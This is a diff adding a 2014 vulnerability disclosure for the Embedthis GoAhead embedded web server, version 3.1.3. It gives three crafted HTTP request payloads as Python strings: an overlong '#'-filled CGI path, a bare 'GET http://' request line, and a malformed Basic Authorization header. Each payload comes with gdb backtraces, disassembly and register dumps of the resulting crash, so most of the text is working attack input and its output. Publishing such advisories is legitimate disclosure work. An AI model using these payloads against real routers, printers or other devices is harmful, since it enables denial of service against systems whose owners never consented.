@@ -1,0 +1,148 @@
+# Title: Embedthis Goahead Webserver multiple DoS vulnerabilities.
+# Author: 0in (Maksymilian Motyl)
+# Date: 18.02.2014
+# Version: 3.1.3-0
+# Software Link: http://embedthis.com/products/goahead/
+# Download: https://github.com/embedthis/goahead
+# Tested on: Linux x32
+# Description: 
+# "GoAhead is embedded in hundreds of millions of devices and applications like: printers, routers, switches, IP phones, mobile applications, data acquisition, 
+# military applications and WIFI gateways."
+# .... Ok.
+# But I cannot confirm any vulnerability in products listed at http://embedthis.com/products/goahead/users.html
+
+-----------------------------------------------
+	1st vulnerability
+
+***************************************
+
+#!/usr/bin/python
+
+packet="GET /cgi-bin/test/a/c/?"+"#"*1024+".cgi/c.txt HTTP/1.1\r\n"\
+"Host: 127.0.0.1\r\n"\
+"User-Agent: BillyExploiter\r\n"\
+"Accept: text/html\r\n"\
+"Accept-Language: pl\r\n"\
+"Accept-Encoding: gzip, deflate\r\n"\
+"Connection: keep-alive"
+
+***************************************
+
+Program received signal SIGABRT, Aborted.
+0xb7772424 in __kernel_vsyscall ()
+(gdb) bt
+#0  0xb7772424 in __kernel_vsyscall ()
+#1  0xb757d941 in *__GI_raise (sig=6) at ../nptl/sysdeps/unix/sysv/linux/raise.c:64
+#2  0xb7580d72 in *__GI_abort () at abort.c:92
+#3  0xb75b9e15 in __libc_message (do_abort=2, 
+    fmt=0xb7691e70 "*** glibc detected *** %s: %s: 0x%s ***\n")
+    at ../sysdeps/unix/sysv/linux/libc_fatal.c:189
+#4  0xb75c3f01 in malloc_printerr (action=<optimized out>, 
+    str=0x6 <Address 0x6 out of bounds>, ptr=0xb7765dad) at malloc.c:6283
+#5  0xb75c517e in munmap_chunk (p=<optimized out>) at malloc.c:3540
+#6  0xb7752d74 in termWebs (wp=wp@entry=0x8573240, reuse=reuse@entry=1)
+    at src/http.c:457
+#7  0xb775309c in reuseConn (wp=0x8573240) at src/http.c:520
+#8  complete (wp=wp@entry=0x8573240, reuse=reuse@entry=1) at src/http.c:575
+#9  0xb7754571 in websPump (wp=wp@entry=0x8573240) at src/http.c:837
+#10 0xb7755606 in readEvent (wp=0x8573240) at src/http.c:797
+#11 socketEvent (wptr=0x8573240, mask=2, sid=<optimized out>) at src/http.c:735
+
+
+*** glibc detected *** goahead: munmap_chunk(): invalid pointer: 0xb7765dad ***
+
+(gdb) x/xw 0xb7765dad
+0xb7765dad:	0x74746800 # "tth" 
+
+-----------------------------------------------
+
+	2nd vulnerability
+
+***************************************
+
+#!/usr/bin/python
+packet="GET http:// HTTP/1.1\r\n"
+
+# Same crash happens when:
+packet="GET http://dupa: HTTP/1.1\r\n"
+
+***************************************
+
+
+Program received signal SIGSEGV, Segmentation fault.
+websDecodeUrl (decoded=decoded@entry=0xb7756253 "/", 
+    input=input@entry=0xb7756253 "/", len=<optimized out>, len@entry=-1)
+    at src/http.c:2225
+warning: Source file is more recent than executable.
+2225	            *op = *ip;
+(gdb) bt
+#0  websDecodeUrl (decoded=decoded@entry=0xb7756253 "/", 
+    input=input@entry=0xb7756253 "/", len=<optimized out>, len@entry=-1)
+    at src/http.c:2225
+#1  0xb774248f in websUrlParse (url=0x83bf140 "http", url@entry=0x83cd58c "http://", 
+    pbuf=pbuf@entry=0xbfe6ce14, pprotocol=pprotocol@entry=0x0, 
+    phost=phost@entry=0xbfe6ce00, pport=pport@entry=0xbfe6ce0c, 
+    ppath=ppath@entry=0xbfe6ce08, pext=pext@entry=0xbfe6ce10, 
+    preference=preference@entry=0x0, pquery=pquery@entry=0xbfe6ce04)
+    at src/http.c:3122
+#2  0xb7745079 in parseFirstLine (wp=0x83bf240) at src/http.c:949
+#3  parseIncoming (wp=0x83bf240) at src/http.c:870
+
+(gdb) disas $eip
+
+   0xb773fb28 <+72>:	cmp    $0x25,%dl
+   0xb773fb2b <+75>:	je     0xb773fb70 <websDecodeUrl+144>
+=> 0xb773fb2d <+77>:	mov    %dl,(%esi)
+
+(gdb) info reg
+eax            0x1	1
+ecx            0x13	19
+edx            0x2f	47
+ebx            0xb775e91c	-1217009380
+esp            0xbfe6cd20	0xbfe6cd20
+ebp            0xb7756254	0xb7756254
+esi            0xb7756253	-1217043885
+edi            0xb7756253	-1217043885
+eip            0xb773fb2d	0xb773fb2d <websDecodeUrl+77>
+
+(gdb) x/xw 0xb7756253
+0xb7756253:	0x7473002f
+
+
+-----------------------------------------------
+
+	3rd vulnerability
+
+***************************************
+
+#!/usr/bin/python
+packet="GET http://127.0.0.1/auth/basic/ HTTP/1.1\r\n"\
+"Host: 127.0.0.1\r\n"\
+"Accept: text/html\r\n"\
+"Accept-Language: pl\r\n"\
+"Accept-Encoding: gzip, deflate\r\n"\
+"Connection: keep-alive\r\n"
+"Authorization: Basic #\r\n"
+***************************************
+
+(gdb) bt
+#0  strchr () at ../sysdeps/i386/strchr.S:127
+#1  0xb770652a in parseBasicDetails (wp=0x8055240) at src/auth.c:717
+#2  0xb7706c31 in websAuthenticate (wp=wp@entry=0x8055240) at src/auth.c:110
+#3  0xb7717532 in websRouteRequest (wp=wp@entry=0x8055240) at src/route.c:85
+
+(gdb) disas $eip
+   0xb758799a <+90>:	lea    0x0(%esi),%esi
+   0xb75879a0 <+96>:	add    $0x10,%eax
+=> 0xb75879a3 <+99>:	mov    (%eax),%ecx
+
+(gdb) info reg
+eax            0x0	0
+ecx            0x3a3a	14906
+edx            0x3a3a3a3a	976894522
+ebx            0xb772a91c	-1217222372
+esp            0xbfc71428	0xbfc71428
+ebp            0x8055240	0x8055240
+esi            0x8055240	134566464
+edi            0x0	0
+eip            0xb75879a3	0xb75879a3 <strchr+99>
